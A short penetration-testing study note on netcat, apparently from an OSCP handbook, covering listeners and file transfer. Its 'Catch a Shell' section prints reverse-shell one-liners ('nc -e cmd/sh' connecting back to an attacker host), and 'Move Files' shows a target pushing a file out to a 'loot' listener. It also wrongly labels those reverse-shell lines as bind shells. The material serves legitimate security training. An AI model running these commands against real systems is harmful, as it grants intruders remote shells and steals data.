---
title: "nc"
slug: nc
category: notes
handbook: oscp
tags: ["shells"]
draft: false
pubDatetime: 2026-09-13T19:42:38+03:00
modDatetime: 2026-09-13T19:42:38+03:00
description: "Netcat, the default listener and raw TCP tool on Kali."
---
Netcat, the default listener and raw TCP tool on Kali. It catches reverse shells ([Reverse Shells](/collections/oscp/reverse-shells)), serves and receives files ([File Transfers](/collections/oscp/file-transfers)), and answers "is that port reachable" without launching anything heavier. Most flags are learned once here and reused everywhere.

## Install

Kali ships a netcat as `nc`. If a system lacks it:

```bash
sudo apt install netcat-openbsd
```

Windows targets have no netcat; `nc.exe` goes over in [File Transfers](/collections/oscp/file-transfers) when a Windows-side listener or sender is needed.

## Listen

```bash
nc -lvnp 8000
```

- `-l` listens instead of connecting.
- `-v` prints the connection when one arrives.
- `-n` skips DNS, so the target shows as an IP.
- `-p` sets the port.

The listener closes after the first connection ends. Restart it, or add `-k` to keep serving repeated connections, useful when a shell keeps dying or several hosts are expected to call back.

## Catch a Shell

The plain listener is enough; every shell form that connects back to it is in [Reverse Shells](/collections/oscp/reverse-shells). Target-side `-e` attaches a program to the connection, which is how bind-shell one-liners hand out a shell:

```bash
nc.exe -e cmd KALI 4444
busybox nc KALI 8000 -e sh
```

## Move Files

Serve a file to the target:

```bash
nc -lvnp 8000 < linpeas.sh
```

Receive a file from the target:

```bash
nc -lvnp 80 > loot.bin
# target side
nc KALI 80 < file.bin
```

The sender finishes and both sides hang on the open connection; when the byte count on the receiving side matches the source file's size, close with `Ctrl-C`. Transfers carry no integrity check, so hash both sides afterwards when it matters.

If nothing arrives at all: no netcat on the target is a common cause, confirm with `command -v nc`, or skip the binary with bash's own TCP support, as in [Reverse Shells](/collections/oscp/reverse-shells).
